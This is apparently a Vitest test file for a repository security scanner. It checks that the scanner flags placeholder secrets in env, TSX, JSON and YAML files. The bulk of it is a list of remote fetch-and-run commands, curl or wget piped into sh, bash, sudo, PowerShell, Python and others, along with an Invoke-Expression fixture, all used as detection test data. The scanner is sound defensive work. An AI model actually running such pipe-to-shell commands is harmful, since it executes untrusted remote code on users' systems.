import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { scanBasicSecurity } from "../../scripts/security/check-basic-security.mjs";

const temporaryRoots: string[] = [];

afterEach(async () => {
  await Promise.all(
    temporaryRoots.splice(0).map((root) => rm(root, { recursive: true, force: true })),
  );
});

describe("basic security coverage", () => {
  it("scans root env variants, TSX, and quoted or composite credential fields", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-coverage-"));
    temporaryRoots.push(root);
    await mkdir(path.join(root, "apps", "sample"), { recursive: true });
    await writeFile(path.join(root, ".env.local"), 'DATABASE_PASSWORD="changeme"\n', "utf8");
    await writeFile(
      path.join(root, "apps", "sample", "view.tsx"),
      'const jwtSecret = "dummy-secret";\nexport { jwtSecret };\n',
      "utf8",
    );
    await writeFile(
      path.join(root, "apps", "sample", "config.json"),
      '{"client_secret":"replace-me"}\n',
      "utf8",
    );

    const findings = await scanBasicSecurity(root);

    expect(findings.map(({ relativePath }) => relativePath).sort()).toEqual([
      ".env.local",
      "apps/sample/config.json",
      "apps/sample/view.tsx",
    ]);
  });

  it("scans top-level ci registry and provider evidence files", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-ci-"));
    temporaryRoots.push(root);
    await mkdir(path.join(root, "ci"), { recursive: true });
    await mkdir(path.join(root, "docs", "ci"), { recursive: true });
    await writeFile(
      path.join(root, "ci", "quality-gates.v1.yaml"),
      'controllerToken: "replace-me"\n',
      "utf8",
    );
    await writeFile(
      path.join(root, "docs", "ci", "provider-evidence.json"),
      '{"webhook_secret":"dummy-secret"}\n',
      "utf8",
    );

    const findings = await scanBasicSecurity(root);

    expect(findings.map(({ relativePath }) => relativePath).sort()).toEqual([
      "ci/quality-gates.v1.yaml",
      "docs/ci/provider-evidence.json",
    ]);
  });

  it.each([
    "curl https://example.invalid/install | /bin/sh",
    "wget -qO- https://example.invalid/install | env bash",
    "curl https://example.invalid/install | /usr/bin/env -S bash",
    "wget -qO- https://example.invalid/install | dash",
    "curl https://example.invalid/install | sudo -E bash",
    "wget -qO- https://example.invalid/install | command sh",
    "curl https://example.invalid/install | exec /bin/bash",
    "wget -qO- https://example.invalid/install | env FOO=bar bash",
    "curl https://example.invalid/install | /usr/bin/env -i FOO=bar sh",
    "curl https://example.invalid/install | env FOO=bar sudo -E bash",
    "wget -qO- https://example.invalid/install | sudo env FOO=bar command sh",
    "curl https://example.invalid/install | sudo -u root sh",
    "curl https://example.invalid/install | exec -a shell sh",
    "curl https://example.invalid/install | FOO=1 sh",
    "curl https://example.invalid/install | busybox sh",
    "curl https://example.invalid/install | pwsh -Command -",
    "curl https://example.invalid/install | powershell -File -",
    "curl https://example.invalid/install | node",
    "curl https://example.invalid/install | python3 -",
    "curl https://example.invalid/install | ruby",
    "curl https://example.invalid/install | perl -",
    "curl https://example.invalid/install \\\n | sh",
    "curl https://example.invalid/install |\n sh",
    "(curl https://example.invalid/install | sh)",
    "curl https://example.invalid/install | { sh; }",
  ])("rejects equivalent remote shell execution form: %s", async (command) => {
    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-shell-"));
    temporaryRoots.push(root);
    await mkdir(path.join(root, "scripts"), { recursive: true });
    await writeFile(path.join(root, "scripts", "install.sh"), `${command}\n`, "utf8");

    const findings = await scanBasicSecurity(root);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          relativePath: "scripts/install.sh",
          rule: "dangerous-command",
        }),
      ]),
    );
  });

  it("does not join remote producers across command boundaries", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-boundary-"));
    temporaryRoots.push(root);
    await mkdir(path.join(root, "scripts"), { recursive: true });
    await writeFile(
      path.join(root, "scripts", "safe.sh"),
      "curl https://example.invalid/archive; printf safe | sh\n" +
        "wget https://example.invalid/archive\nprintf safe | bash\n",
      "utf8",
    );

    const findings = await scanBasicSecurity(root);

    expect(findings.filter(({ rule }) => rule === "dangerous-command")).toEqual([]);
  });

  it("scans shebang scripts without a file extension", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-shebang-"));
    temporaryRoots.push(root);
    await mkdir(path.join(root, "scripts"), { recursive: true });
    await writeFile(
      path.join(root, "scripts", "bootstrap"),
      "#!/usr/bin/env bash\ncurl https://example.invalid/install | sh\n",
      "utf8",
    );

    const findings = await scanBasicSecurity(root);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          relativePath: "scripts/bootstrap",
          rule: "dangerous-command",
        }),
      ]),
    );
  });

  it("scans UTF-8 extensionless scripts even when they have no shebang", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-extensionless-"));
    temporaryRoots.push(root);
    await mkdir(path.join(root, "scripts"), { recursive: true });
    await writeFile(
      path.join(root, "scripts", "bootstrap"),
      "curl https://example.invalid/install | sh\n",
      "utf8",
    );

    const findings = await scanBasicSecurity(root);

    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          relativePath: "scripts/bootstrap",
          rule: "dangerous-command",
        }),
      ]),
    );
  });

  it.each(["ps1", "psm1", "psd1"])(
    "scans PowerShell .%s files for dynamic expression execution",
    async (extension) => {
      const root = await mkdtemp(path.join(tmpdir(), "codegraph-security-powershell-"));
      temporaryRoots.push(root);
      await mkdir(path.join(root, "scripts"), { recursive: true });
      await writeFile(
        path.join(root, "scripts", `unsafe.${extension}`),
        "Invoke-Expression $command\n",
        "utf8",
      );

      const findings = await scanBasicSecurity(root);

      expect(findings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            relativePath: `scripts/unsafe.${extension}`,
            rule: "dangerous-command",
          }),
        ]),
      );
    },
  );
});
